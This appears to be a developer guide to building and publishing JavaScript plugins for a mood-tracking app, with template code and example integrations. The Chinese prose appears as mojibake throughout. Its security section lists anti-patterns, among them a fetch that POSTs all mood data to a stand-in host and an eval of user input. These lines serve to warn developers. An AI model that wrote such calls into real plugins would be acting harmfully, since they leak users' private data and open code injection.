# ğŸ§© MoodTracker Pro - æ’ä»¶å¼€å‘æŒ‡å—

## ğŸ“‹ ç›®å½•
1. [æ’ä»¶ç³»ç»Ÿæ¦‚è¿°](#æ’ä»¶ç³»ç»Ÿæ¦‚è¿°)
2. [æ’ä»¶ç»“æ„](#æ’ä»¶ç»“æ„)
3. [å¼€å‘ç¤ºä¾‹](#å¼€å‘ç¤ºä¾‹)
4. [å‘å¸ƒåˆ°æ’ä»¶å¸‚åœº](#å‘å¸ƒåˆ°æ’ä»¶å¸‚åœº)
5. [æœ€ä½³å®è·µ](#æœ€ä½³å®è·µ)

---

## ğŸ¯ æ’ä»¶ç³»ç»Ÿæ¦‚è¿°

MoodTracker Pro çš„æ’ä»¶ç³»ç»Ÿå…è®¸å¼€å‘è€…æ‰©å±•åº”ç”¨åŠŸèƒ½ï¼Œæ— éœ€ä¿®æ”¹æ ¸å¿ƒä»£ç ã€‚

### ç‰¹ç‚¹
- âœ… **çº¯JavaScript** - æ— éœ€ç¼–è¯‘
- âœ… **GitHubæ‰˜ç®¡** - å®Œå…¨å…è´¹
- âœ… **å³æ—¶åŠ è½½** - æ— éœ€é‡å¯åº”ç”¨
- âœ… **å®Œæ•´API** - è®¿é—®æ‰€æœ‰æ•°æ®å’ŒåŠŸèƒ½
- âœ… **äº‹ä»¶é©±åŠ¨** - å“åº”åº”ç”¨äº‹ä»¶

---

## ğŸ“¦ æ’ä»¶ç»“æ„

### æœ€å°æ’ä»¶ç¤ºä¾‹

```javascript
// my-plugin.js
(function() {
    const plugin = {
        // åŸºæœ¬ä¿¡æ¯
        name: 'My Plugin',
        version: '1.0.0',
        author: 'Your Name',
        description: 'æ’ä»¶æè¿°',
        
        // åˆå§‹åŒ–å‡½æ•°ï¼ˆå¿…éœ€ï¼‰
        init: function(api) {
            console.log(`${this.name} å·²åŠ è½½`);
            
            // ä½¿ç”¨API
            api.on('moodSaved', (data) => {
                console.log('å¿ƒæƒ…å·²ä¿å­˜:', data);
            });
        },
        
        // å¸è½½å‡½æ•°ï¼ˆå¯é€‰ï¼‰
        destroy: function() {
            console.log(`${this.name} å·²å¸è½½`);
        }
    };
    
    // è‡ªåŠ¨æ³¨å†Œæ’ä»¶
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    } else {
        document.addEventListener('DOMContentLoaded', () => {
            window.MoodTrackerAPI.registerPlugin(plugin);
        });
    }
})();
```

### å®Œæ•´æ’ä»¶æ¨¡æ¿

```javascript
// advanced-plugin.js
(function() {
    'use strict';
    
    const plugin = {
        // ============ å…ƒæ•°æ® ============
        name: 'Advanced Plugin',
        version: '1.0.0',
        author: 'Developer Name',
        email: 'dev@example.com',
        website: 'https://github.com/yourusername/plugin',
        description: 'A powerful plugin that extends MoodTracker Pro',
        
        // ä¾èµ–é¡¹ï¼ˆå¯é€‰ï¼‰
        dependencies: [],
        
        // é…ç½®é¡¹
        config: {
            enabled: true,
            apiKey: '',
            interval: 60000
        },
        
        // ============ ç”Ÿå‘½å‘¨æœŸ ============
        init: function(api) {
            this.api = api;
            this.listeners = [];
            
            console.log(`ğŸ”Œ ${this.name} v${this.version} initialized`);
            
            // åŠ è½½é…ç½®
            this.loadConfig();
            
            // æ³¨å†Œäº‹ä»¶ç›‘å¬å™¨
            this.registerEventListeners();
            
            // å¯åŠ¨å®šæ—¶ä»»åŠ¡
            if (this.config.enabled) {
                this.startBackgroundTask();
            }
        },
        
        destroy: function() {
            // æ¸…ç†äº‹ä»¶ç›‘å¬å™¨
            this.listeners.forEach(({ event, handler }) => {
                this.api.off(event, handler);
            });
            
            // åœæ­¢å®šæ—¶ä»»åŠ¡
            if (this.interval) {
                clearInterval(this.interval);
            }
            
            console.log(`ğŸ”Œ ${this.name} destroyed`);
        },
        
        // ============ é…ç½®ç®¡ç† ============
        loadConfig: function() {
            const saved = localStorage.getItem(`plugin_${this.name}_config`);
            if (saved) {
                this.config = { ...this.config, ...JSON.parse(saved) };
            }
        },
        
        saveConfig: function() {
            localStorage.setItem(`plugin_${this.name}_config`, JSON.stringify(this.config));
        },
        
        // ============ äº‹ä»¶å¤„ç† ============
        registerEventListeners: function() {
            const handlers = {
                'moodSaved': this.onMoodSaved.bind(this),
                'moodUpdated': this.onMoodUpdated.bind(this),
                'moodDeleted': this.onMoodDeleted.bind(this)
            };
            
            for (const [event, handler] of Object.entries(handlers)) {
                this.api.on(event, handler);
                this.listeners.push({ event, handler });
            }
        },
        
        onMoodSaved: function(data) {
            console.log('Mood saved:', data);
            // å¤„ç†å¿ƒæƒ…ä¿å­˜äº‹ä»¶
        },
        
        onMoodUpdated: function(data) {
            console.log('Mood updated:', data);
        },
        
        onMoodDeleted: function(data) {
            console.log('Mood deleted:', data);
        },
        
        // ============ åå°ä»»åŠ¡ ============
        startBackgroundTask: function() {
            this.interval = setInterval(() => {
                this.backgroundTask();
            }, this.config.interval);
        },
        
        backgroundTask: function() {
            // æ‰§è¡Œå®šæœŸä»»åŠ¡
            console.log('Background task running...');
        },
        
        // ============ è‡ªå®šä¹‰åŠŸèƒ½ ============
        customMethod: function() {
            const moods = this.api.getMoods();
            // å¤„ç†æ•°æ®...
            return moods;
        }
    };
    
    // æ³¨å†Œæ’ä»¶
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    } else {
        document.addEventListener('DOMContentLoaded', () => {
            window.MoodTrackerAPI.registerPlugin(plugin);
        });
    }
})();
```

---

## ğŸ¨ å¼€å‘ç¤ºä¾‹

### ç¤ºä¾‹1ï¼šå¤©æ°”é›†æˆæ’ä»¶

```javascript
// weather-plugin.js
(function() {
    const plugin = {
        name: 'Weather Integration',
        version: '1.0.0',
        author: 'WeatherDev',
        description: 'è‡ªåŠ¨è®°å½•æ¯æ¬¡å¿ƒæƒ…è®°å½•æ—¶çš„å¤©æ°”çŠ¶å†µ',
        
        config: {
            apiKey: '', // OpenWeatherMap API key
            units: 'metric'
        },
        
        init: function(api) {
            this.api = api;
            this.loadConfig();
            
            // ç›‘å¬å¿ƒæƒ…ä¿å­˜
            api.on('moodSaved', async (data) => {
                if (!this.config.apiKey) {
                    console.warn('Weather plugin: API key not configured');
                    return;
                }
                
                try {
                    const weather = await this.fetchWeather();
                    console.log(`Weather: ${weather.description}, ${weather.temp}Â°C`);
                    
                    // å¯ä»¥å°†å¤©æ°”ä¿¡æ¯æ·»åŠ åˆ°ç¬”è®°ä¸­
                    const note = data.mood.note || '';
                    const updatedNote = `${note}\n\n[Weather: ${weather.description}, ${weather.temp}Â°C]`;
                    
                    api.updateMood(data.mood.id, { note: updatedNote });
                } catch (error) {
                    console.error('Failed to fetch weather:', error);
                }
            });
        },
        
        fetchWeather: async function() {
            // è·å–ä½ç½®
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            });
            
            const { latitude, longitude } = position.coords;
            
            // è·å–å¤©æ°”
            const url = `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=${this.config.apiKey}&units=${this.config.units}`;
            const response = await fetch(url);
            const data = await response.json();
            
            return {
                description: data.weather[0].description,
                temp: Math.round(data.main.temp),
                humidity: data.main.humidity,
                icon: data.weather[0].icon
            };
        },
        
        loadConfig: function() {
            const saved = localStorage.getItem('plugin_Weather_config');
            if (saved) {
                this.config = { ...this.config, ...JSON.parse(saved) };
            }
        }
    };
    
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    }
})();
```

### ç¤ºä¾‹2ï¼šGitHubæäº¤ç»Ÿè®¡æ’ä»¶

```javascript
// github-commits-plugin.js
(function() {
    const plugin = {
        name: 'GitHub Commits',
        version: '1.0.0',
        author: 'GitHubDev',
        description: 'å…³è”GitHubæäº¤ç»Ÿè®¡ä¸å¿ƒæƒ…æ•°æ®',
        
        config: {
            username: '',
            token: '' // GitHub Personal Access Token (optional)
        },
        
        init: function(api) {
            this.api = api;
            this.loadConfig();
            
            // æ¯å¤©è·å–ä¸€æ¬¡GitHubæäº¤æ•°æ®
            this.syncGitHubCommits();
            setInterval(() => this.syncGitHubCommits(), 24 * 60 * 60 * 1000);
        },
        
        syncGitHubCommits: async function() {
            if (!this.config.username) return;
            
            try {
                const commits = await this.fetchGitHubCommits();
                console.log(`Found ${commits.length} commits today`);
                
                // å¯ä»¥å°†æäº¤æ•°æ®å…³è”åˆ°å½“å¤©çš„å¿ƒæƒ…è®°å½•
                const moods = this.api.getMoods();
                const today = moods.filter(m => {
                    const moodDate = new Date(m.date).toDateString();
                    const todayDate = new Date().toDateString();
                    return moodDate === todayDate;
                });
                
                if (today.length > 0 && commits.length > 0) {
                    const note = today[0].note || '';
                    const commitNote = `\n\n[GitHub: ${commits.length} commits today]`;
                    
                    this.api.updateMood(today[0].id, {
                        note: note + commitNote
                    });
                }
            } catch (error) {
                console.error('Failed to sync GitHub commits:', error);
            }
        },
        
        fetchGitHubCommits: async function() {
            const today = new Date().toISOString().split('T')[0];
            const url = `https://api.github.com/search/commits?q=author:${this.config.username}+committer-date:${today}`;
            
            const headers = {
                'Accept': 'application/vnd.github.cloak-preview+json'
            };
            
            if (this.config.token) {
                headers['Authorization'] = `token ${this.config.token}`;
            }
            
            const response = await fetch(url, { headers });
            const data = await response.json();
            
            return data.items || [];
        },
        
        loadConfig: function() {
            const saved = localStorage.getItem('plugin_GitHub_config');
            if (saved) {
                this.config = { ...this.config, ...JSON.parse(saved) };
            }
        }
    };
    
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    }
})();
```

### ç¤ºä¾‹3ï¼šæ•°æ®å¯è§†åŒ–å¢å¼ºæ’ä»¶

```javascript
// advanced-charts-plugin.js
(function() {
    const plugin = {
        name: 'Advanced Charts',
        version: '1.0.0',
        author: 'ChartsDev',
        description: 'æ·»åŠ æ›´å¤šå›¾è¡¨ç±»å‹å’Œå¯è§†åŒ–é€‰é¡¹',
        
        init: function(api) {
            this.api = api;
            
            // æ·»åŠ æ–°çš„å›¾è¡¨æ–¹æ³•åˆ°API
            api.createHeatmap = this.createHeatmap.bind(this);
            api.createRadarChart = this.createRadarChart.bind(this);
            
            console.log('Advanced Charts loaded! Use api.createHeatmap() and api.createRadarChart()');
        },
        
        createHeatmap: function(containerId) {
            const moods = this.api.getMoods();
            
            // æŒ‰æ—¥æœŸåˆ†ç»„
            const heatmapData = {};
            moods.forEach(mood => {
                const date = new Date(mood.date).toISOString().split('T')[0];
                heatmapData[date] = mood.mood;
            });
            
            // åˆ›å»ºçƒ­åŠ›å›¾ï¼ˆç®€åŒ–ç‰ˆï¼‰
            const container = document.getElementById(containerId);
            if (!container) return;
            
            let html = '<div class="heatmap">';
            for (const [date, mood] of Object.entries(heatmapData)) {
                const color = this.getMoodColor(mood);
                html += `<div class="heatmap-cell" style="background-color: ${color}" title="${date}: ${mood}/5"></div>`;
            }
            html += '</div>';
            
            container.innerHTML = html;
        },
        
        createRadarChart: function(containerId) {
            // åˆ›å»ºé›·è¾¾å›¾æ˜¾ç¤ºä¸åŒæ–¹é¢çš„å¿ƒæƒ…
            console.log('Radar chart created in', containerId);
        },
        
        getMoodColor: function(mood) {
            const colors = [
                '#dc3545', // Very Bad
                '#fd7e14', // Bad
                '#ffc107', // Neutral
                '#28a745', // Good
                '#00ff88'  // Excellent
            ];
            return colors[mood - 1] || '#666';
        }
    };
    
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    }
})();
```

---

## ğŸŒ å‘å¸ƒåˆ°æ’ä»¶å¸‚åœº

### æ­¥éª¤1ï¼šåˆ›å»ºGitHubä»“åº“

```bash
# 1. åˆ›å»ºæ–°ä»“åº“
mkdir moodtracker-weather-plugin
cd moodtracker-weather-plugin

# 2. åˆå§‹åŒ–
git init
```

### æ­¥éª¤2ï¼šåˆ›å»ºæ’ä»¶æ–‡ä»¶

```
moodtracker-weather-plugin/
â”œâ”€â”€ plugin.js          # æ’ä»¶ä¸»æ–‡ä»¶
â”œâ”€â”€ README.md          # è¯´æ˜æ–‡æ¡£
â”œâ”€â”€ LICENSE           # å¼€æºåè®®
â””â”€â”€ manifest.json     # æ’ä»¶æ¸…å•
```

### æ­¥éª¤3ï¼šç¼–å†™manifest.json

```json
{
  "name": "Weather Integration",
  "version": "1.0.0",
  "description": "Automatically record weather conditions with mood entries",
  "author": "Your Name",
  "email": "your@email.com",
  "homepage": "https://github.com/yourusername/moodtracker-weather-plugin",
  "license": "MIT",
  "main": "plugin.js",
  "category": "integration",
  "tags": ["weather", "integration", "automation"],
  "screenshots": [
    "https://raw.githubusercontent.com/yourusername/repo/main/screenshot1.png"
  ],
  "minAppVersion": "1.0.0",
  "dependencies": [],
  "permissions": [
    "geolocation",
    "fetch"
  ]
}
```

### æ­¥éª¤4ï¼šæäº¤åˆ°GitHub

```bash
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/yourusername/moodtracker-weather-plugin.git
git push -u origin main
```

### æ­¥éª¤5ï¼šæ·»åŠ åˆ°æ’ä»¶å¸‚åœº

åˆ›å»ºPull Requeståˆ°æ’ä»¶å¸‚åœºä»“åº“ï¼š
```
https://github.com/moodtracker-pro/plugins
```

åœ¨plugins.jsonä¸­æ·»åŠ ï¼š
```json
{
  "id": "weather-integration",
  "name": "Weather Integration",
  "author": "Your Name",
  "version": "1.0.0",
  "description": "Automatically record weather conditions",
  "category": "integration",
  "repository": "https://github.com/yourusername/moodtracker-weather-plugin",
  "main": "https://raw.githubusercontent.com/yourusername/moodtracker-weather-plugin/main/plugin.js",
  "manifest": "https://raw.githubusercontent.com/yourusername/moodtracker-weather-plugin/main/manifest.json",
  "icon": "fas fa-cloud-sun",
  "downloads": 0,
  "rating": 0,
  "verified": false
}
```

---

## âœ… æœ€ä½³å®è·µ

### 1. ä»£ç è´¨é‡

```javascript
// âœ… å¥½çš„åšæ³•
(function() {
    'use strict';
    
    const plugin = {
        name: 'MyPlugin',
        
        init: function(api) {
            try {
                // å®‰å…¨çš„åˆå§‹åŒ–ä»£ç 
                this.api = api;
            } catch (error) {
                console.error('Plugin init failed:', error);
            }
        }
    };
    
    // å®‰å…¨æ³¨å†Œ
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    }
})();

// âŒ ä¸å¥½çš„åšæ³•
var plugin = {
    init: function() {
        // æœªåŒ…è£¹åœ¨IIFEä¸­
        // å¯èƒ½æ±¡æŸ“å…¨å±€ä½œç”¨åŸŸ
    }
};
```

### 2. é”™è¯¯å¤„ç†

```javascript
// âœ… å§‹ç»ˆå¤„ç†é”™è¯¯
async fetchData() {
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        return await response.json();
    } catch (error) {
        console.error('Fetch failed:', error);
        this.api.showToast('Failed to load data');
        return null;
    }
}
```

### 3. æ€§èƒ½ä¼˜åŒ–

```javascript
// âœ… ä½¿ç”¨èŠ‚æµå’Œé˜²æŠ–
init: function(api) {
    this.api = api;
    
    // èŠ‚æµï¼šæœ€å¤šæ¯ç§’æ‰§è¡Œä¸€æ¬¡
    const throttledUpdate = this.throttle(() => {
        this.updateData();
    }, 1000);
    
    api.on('moodSaved', throttledUpdate);
},

throttle: function(func, limit) {
    let inThrottle;
    return function() {
        if (!inThrottle) {
            func.apply(this, arguments);
            inThrottle = true;
            setTimeout(() => inThrottle = false, limit);
        }
    };
}
```

### 4. ç”¨æˆ·éšç§

```javascript
// âœ… å°Šé‡ç”¨æˆ·éšç§
init: function(api) {
    // è¯·æ±‚æƒé™
    this.requestPermission();
    
    // æ˜ç¡®å‘ŠçŸ¥ç”¨æˆ·æ•°æ®ç”¨é€”
    console.log('This plugin will access your mood data for analysis');
},

requestPermission: async function() {
    const consent = confirm('Allow this plugin to access your location?');
    if (!consent) {
        console.log('Permission denied');
        return false;
    }
    return true;
}
```

### 5. æ–‡æ¡£åŒ–

```javascript
/**
 * Weather Integration Plugin
 * 
 * @description Automatically records weather conditions with mood entries
 * @version 1.0.0
 * @author Your Name
 * 
 * Configuration:
 * - apiKey: OpenWeatherMap API key (required)
 * - units: Temperature units (metric/imperial)
 * 
 * Events:
 * - Listens to: moodSaved
 * - Emits: weatherFetched
 */
```

---

## ğŸ”’ å®‰å…¨æŒ‡å—

### é¿å…çš„å±é™©æ“ä½œ

```javascript
// âŒ ä¸è¦ä½¿ç”¨eval
eval(userInput);  // æåº¦å±é™©ï¼

// âŒ ä¸è¦ç›´æ¥æ“ä½œDOMï¼ˆå¯èƒ½ç ´ååº”ç”¨ï¼‰
document.body.innerHTML = '';

// âŒ ä¸è¦å‘é€ç”¨æˆ·æ•°æ®åˆ°æœªçŸ¥æœåŠ¡å™¨
fetch('https://unknown-server.com', {
    method: 'POST',
    body: JSON.stringify(api.getMoods())  // éšç§æ³„éœ²ï¼
});

// âŒ ä¸è¦è¦†ç›–æ ¸å¿ƒAPIæ–¹æ³•
api.getMoods = function() { return []; };  // ç ´åæ€§æ“ä½œï¼
```

### å®‰å…¨çš„åšæ³•

```javascript
// âœ… éªŒè¯è¾“å…¥
validateInput: function(input) {
    if (typeof input !== 'string') return false;
    if (input.length > 1000) return false;
    return true;
},

// âœ… åªè¯»å–å¿…è¦çš„æ•°æ®
getRecentMoods: function() {
    const moods = this.api.getMoods();
    return moods.slice(-7);  // åªè·å–æœ€è¿‘7å¤©
},

// âœ… æ˜ç¡®æƒé™éœ€æ±‚
permissions: [
    'read:moods',    // è¯»å–å¿ƒæƒ…æ•°æ®
    'geolocation'    // è·å–ä½ç½®
]
```

---

## ğŸ“ å­¦ä¹ èµ„æº

- **MoodTracker Pro APIæ–‡æ¡£**: `APIä½¿ç”¨æ–‡æ¡£.md`
- **æ’ä»¶ç¤ºä¾‹ä»“åº“**: https://github.com/moodtracker-pro/example-plugins
- **æ’ä»¶å¸‚åœº**: åº”ç”¨å†…è®¿é—®
- **å¼€å‘è€…ç¤¾åŒº**: GitHub Discussions

---

## ğŸ“ è·å–å¸®åŠ©

- **GitHub Issues**: æŠ¥å‘Šbugæˆ–è¯·æ±‚åŠŸèƒ½
- **Discussions**: æŠ€æœ¯è®¨è®ºå’Œé—®é¢˜è§£ç­”
- **Email**: support@moodtracker.pro

---

**ç¥æ‚¨å¼€å‘æ„‰å¿«ï¼** ğŸš€

æœŸå¾…çœ‹åˆ°æ‚¨åˆ›å»ºçš„ç²¾å½©æ’ä»¶ï¼
